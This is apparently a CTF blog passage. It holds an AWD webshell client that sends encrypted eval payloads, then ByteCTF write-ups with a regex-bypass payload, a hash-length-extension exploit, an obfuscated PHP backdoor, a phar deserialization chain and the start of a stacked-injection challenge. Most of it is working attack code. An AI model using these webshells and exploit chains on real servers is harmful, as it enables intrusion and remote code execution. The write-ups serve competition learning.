class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">:</span>        output<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">padding_pkcs5</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> bytes<span class="token punctuation">:</span>    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>        msg <span class="token operator">=</span> msg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x10</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> msg <span class="token operator">+</span> b<span class="token string">'\x10'</span> <span class="token operator">*</span> <span class="token number">0x10</span>    <span class="token keyword">return</span> msg <span class="token operator">+</span> <span class="token punctuation">(</span>        <span class="token number">0x10</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">*</span> chr<span class="token punctuation">(</span><span class="token number">0x10</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>msg<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">aes_encrypt</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> str<span class="token punctuation">:</span>    key<span class="token operator">=</span>padding_zero<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    enc <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> b<span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>enc<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>padding_pkcs5<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># def aes_encrypt_os(text,key):</span><span class="token comment" spellcheck="true">#     command = "php -r \"echo @openssl_encrypt(\\\"{}\\\", 'AES128', '{}');\"".format(text,key)</span><span class="token comment" spellcheck="true">#     str =os.popen(command).readline()</span><span class="token comment" spellcheck="true">#     return str</span><span class="token keyword">def</span> <span class="token function">get_key</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    Getparams<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"pass"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">}</span>    key <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>Getparams<span class="token punctuation">)</span><span class="token punctuation">.</span>content    key <span class="token operator">=</span> str<span class="token punctuation">(</span>key<span class="token punctuation">,</span> encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> key<span class="token keyword">def</span> <span class="token function">main_exec</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>command<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    command <span class="token operator">=</span> bytes<span class="token punctuation">(</span>command<span class="token punctuation">,</span> encoding <span class="token operator">=</span> <span class="token string">"utf8"</span><span class="token punctuation">)</span>    command_b64<span class="token operator">=</span> str<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">,</span> encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span>    command_eval<span class="token operator">=</span><span class="token string">"assert|eval(base64_decode('{}'));"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>command_b64<span class="token punctuation">)</span>    postdata<span class="token operator">=</span>aes_encrypt<span class="token punctuation">(</span>command_eval<span class="token punctuation">,</span>key<span class="token punctuation">)</span>    res<span class="token operator">=</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>postdata<span class="token punctuation">)</span><span class="token punctuation">.</span>content    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">main_exec_encode</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>command<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    command2 <span class="token operator">=</span> <span class="token string">"ob_start();"</span><span class="token operator">+</span>command<span class="token operator">+</span><span class="token string">"$flag = ob_get_contents();ob_end_clean();for($i=0;$i&lt;10;$i++){$flag=bin2hex($flag);$flag=base64_encode($flag);}print($flag);"</span>    command2 <span class="token operator">=</span> bytes<span class="token punctuation">(</span>command2<span class="token punctuation">,</span> encoding <span class="token operator">=</span> <span class="token string">"utf8"</span><span class="token punctuation">)</span>    command_b64 <span class="token operator">=</span> str<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>command2<span class="token punctuation">)</span><span class="token punctuation">,</span> encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span>    command_eval<span class="token operator">=</span><span class="token string">"assert|eval(base64_decode('{}'));"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>command_b64<span class="token punctuation">)</span>    postdata<span class="token operator">=</span>aes_encrypt<span class="token punctuation">(</span>command_eval<span class="token punctuation">,</span>key<span class="token punctuation">)</span>    res<span class="token operator">=</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>postdata<span class="token punctuation">)</span><span class="token punctuation">.</span>content    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>res<span class="token punctuation">)</span>        res <span class="token operator">=</span> codecs<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>res<span class="token punctuation">,</span><span class="token string">"hex"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    url <span class="token operator">=</span> <span class="token string">"http://url/shell3.php"</span>    command <span class="token operator">=</span> <span class="token string">"system('cat /flag');"</span>    key <span class="token operator">=</span> get_key<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    flag <span class="token operator">=</span> main_exec<span class="token punctuation">(</span>url<span class="token punctuation">,</span>command<span class="token punctuation">,</span>key<span class="token punctuation">)</span>    flag2 <span class="token operator">=</span> main_exec_encode<span class="token punctuation">(</span>url<span class="token punctuation">,</span>command<span class="token punctuation">,</span>key<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag2<span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> awd </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bytectf writeup</title>
      <link href="/2019/09/07/writeup/bytectf-writeup/"/>
      <url>/2019/09/07/writeup/bytectf-writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="boring-code-绕正则"><a href="#boring-code-绕正则" class="headerlink" title="boring code(绕正则)"></a>boring code(绕正则)</h2><p>在index.php中</p><pre class=" language-html"><code class="language-html">// index.php<span class="token comment" spellcheck="true">&lt;!-- flag in this file and code in /code --></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// /code</span><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">is_valid_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/data:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/baidu\.com$/'</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">echo</span> <span class="token string">'bye~'</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"error: host not allowed"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"error: invalid url"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>flag在index.php中</p><p>code里先过滤了data函数</p><p>要满足url参数的后缀的baidu.com结尾</p><p>code参数满足正则 类似xxx(xxx(xxx()))这种格式</p><p>看一下可用函数</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">get_defined_functions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'internal'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/_/'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>                     <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$value</span><span class="token punctuation">.</span><span class="token string">"()&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这些函数中能操作目录的有</p><pre><code>rmdir mkdir opendir closedir chdir rewinddir readdir dir scandir</code></pre><p>可以通过chr(time())构造 ‘.’字符</p><pre><code>chr(46) chr(302) chr(558)的值都为.</code></pre><p>next(scandir(chr(time())))可以得到 ‘..’字符</p><p>chdir(‘..’)没有地方放，time的函数参数是void，就放在time(void)里也没有影响</p><p>end(scandir(chr(time())))可以得到网站根目录下的index.php</p><p>最后payload如下，最多打256次</p><pre><code>readfile(end(scandir(chr(time(chdir(next(scandir(chr(time())))))))));</code></pre><p>exp</p><pre><code>import requestsimport timeurl=&quot;http://localhost/code/&quot;s=requests.Session()payload={&quot;url&quot;:&quot;http://xxx&quot;}for i in range(400):    time.sleep(0.7)    print(i)    r=s.post(url,data=payload)    if &quot;flag&quot; in r.text:        print (r.text)</code></pre><p>第一层用百度贴吧，百度网盘</p><p>或者<code>compress.zlib://data:@baidu.com/;base64,Pmxz&quot;);</code></p><h3 id="Data-URI-scheme-的语法"><a href="#Data-URI-scheme-的语法" class="headerlink" title="Data URI scheme 的语法"></a>Data URI scheme 的语法</h3><blockquote><p> <strong>data:①[&lt;mime type&gt;]②[;charset=&lt;charset&gt;]③[;&lt;encoding&gt;]④,&lt;encoded data&gt;⑤</strong></p></blockquote><p><strong>第①部分</strong><code>data:</code><strong>：</strong> 协议头，它标识这个内容为一个 data URI 资源。</p><p><strong>第②部分</strong><code>[&lt;mime type&gt;]</code><strong>（可选项）：</strong>浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理文档；因此服务器设置正确以将正确的MIME类型附加到响应对象的头部是非常重要的。MIME类型对大小写不敏感，但是传统写法都是小写。</p><p>例如：<strong>text/plain，image/jpeg</strong> 等</p><p><strong>第③部分 *<em><code>[;charset=&lt;charset&gt;]</code> *</em>（可选项）:</strong>源文本的字符集编码方式，默认编码是 charset=US-ASCII, 即数据部分的每个字符都会自动编码为 %xx</p><p><strong>第④部分</strong><code>[;&lt;encoding&gt;]</code> *<em>： *</em>数据编码方式（默认US-ASCII，BASE64两种）</p><p><strong>第⑤部分</strong><code>,&lt;encoded data&gt;</code> <strong>：</strong> 编码后的数据</p><p><code>baidu.com/</code>代替的是data协议中的mine类型</p><h3 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h3><p>vim编辑后保存会自动在结尾加上换行符</p><p>需要设置成二进制文件格式</p><pre><code>:set binary:set noendofline:wq</code></pre><p>##ezcms(phar反序列化)</p><p>扫目录<a href="http://www.zip，查看源码" target="_blank" rel="noopener">www.zip，查看源码</a></p><p>####1.hash拓展攻击</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//config.php</span><span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">"********"</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"hash"</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">.</span><span class="token string">"adminadmin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashpumpysignature<span class="token operator">=</span><span class="token string">"52107b08c0f3342d2153ae1d68e6262c"</span>original_data<span class="token operator">=</span><span class="token string">"admin"</span>add_data<span class="token operator">=</span><span class="token string">"admin"</span>key_length<span class="token operator">=</span><span class="token number">8</span><span class="token operator">+</span><span class="token number">5</span>hash<span class="token operator">=</span>hashpumpy<span class="token punctuation">.</span>hashpump<span class="token punctuation">(</span>signature<span class="token punctuation">,</span>original_data<span class="token punctuation">,</span>add_data<span class="token punctuation">,</span>key_length<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>hash<span class="token punctuation">)</span>admin<span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">90</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span>00admin<span class="token string">'7e6270e35bf7b74982d8fff6382b5048'</span></code></pre><p>用账号admin 密码%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin 设置cookies[‘user’]=7e6270e35bf7b74982d8fff6382b5048 可以上传文件</p><p>####2.上传后门文件</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string">"syste"</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string">"m"</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h4 id="3-触发反序列化"><a href="#3-触发反序列化" class="headerlink" title="3.触发反序列化"></a>3.触发反序列化</h4><p>来自suctf</p><pre><code>finfo_file / finfo_buffer / mime_content_type</code></pre><p>均通过<code>_php_finfo_get_type</code>间接调用了关键函数<code>php_stream_open_wrapper_ex</code>，导致均可以使用<code>phar://</code>触发 phar 反序列化，所以这里我选择了<code>finfo_file</code>作为 phar 反序列化的触发函数。</p><p>三个函数在 <a href="https://github.com/php/php-src/blob/47b95bd83c8f2b492a32cdfa58247c197271d248/ext/fileinfo/fileinfo.c#L599" target="_blank" rel="noopener">fileinfo.c 599 行</a>中 通过 <code>_php_finfo_get_type</code> 定义，在 552 行中 <code>_php_finfo_get_types</code> 调用了 <a href="https://github.com/php/php-src/blob/47b95bd83c8f2b492a32cdfa58247c197271d248/ext/fileinfo/fileinfo.c#L552" target="_blank" rel="noopener">php_stream_open_wrapper_ex</a></p><p>payload</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Profile</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string">'/var/www/html/sandbox/9931f06e1af1fd77c1e95e84443dd6f6/.htaccess'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token constant">ZIPARCHIVE</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">OVERWRITE</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"test.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件，可忽略</span><span class="token comment" spellcheck="true">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>####4.绕过phar开头限制</p><p>使用php://filter协议</p><pre><code>filepath=php://filter/resource=phar://sandbox/a87136ce5a8b85871f1d0b6b2add38d2/dd7ec931179c4dcb6a8ffb8b8786d20b.txt</code></pre><h4 id="5-使用内置类ZipArchive的open函数删除-htaccess文件"><a href="#5-使用内置类ZipArchive的open函数删除-htaccess文件" class="headerlink" title="5.使用内置类ZipArchive的open函数删除.htaccess文件"></a>5.使用内置类ZipArchive的open函数删除.htaccess文件</h4><p>查看文档ZipArchive::open ( filename ,flags )有两个参数</p><p>flags参数为<strong>ZIPARCHIVE::OVERWRITE</strong> (<a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a>)</p><p>总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖。 </p><p>可以open(‘.htaccess’,ZIPARCHIVE::OVERWRITE)删除.htaccess</p><h2 id="babyblog-堆叠注入-LD-PRELOAD-bypassDF"><a href="#babyblog-堆叠注入-LD-PRELOAD-bypassDF" class="headerlink" title="babyblog(堆叠注入 LD_PRELOAD bypassDF)"></a>babyblog(堆叠注入 LD_PRELOAD bypassDF)</h2><p>下载源码<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//edit.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"select * from article where id="</span> <span class="token punctuation">.</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">";"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$v</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token 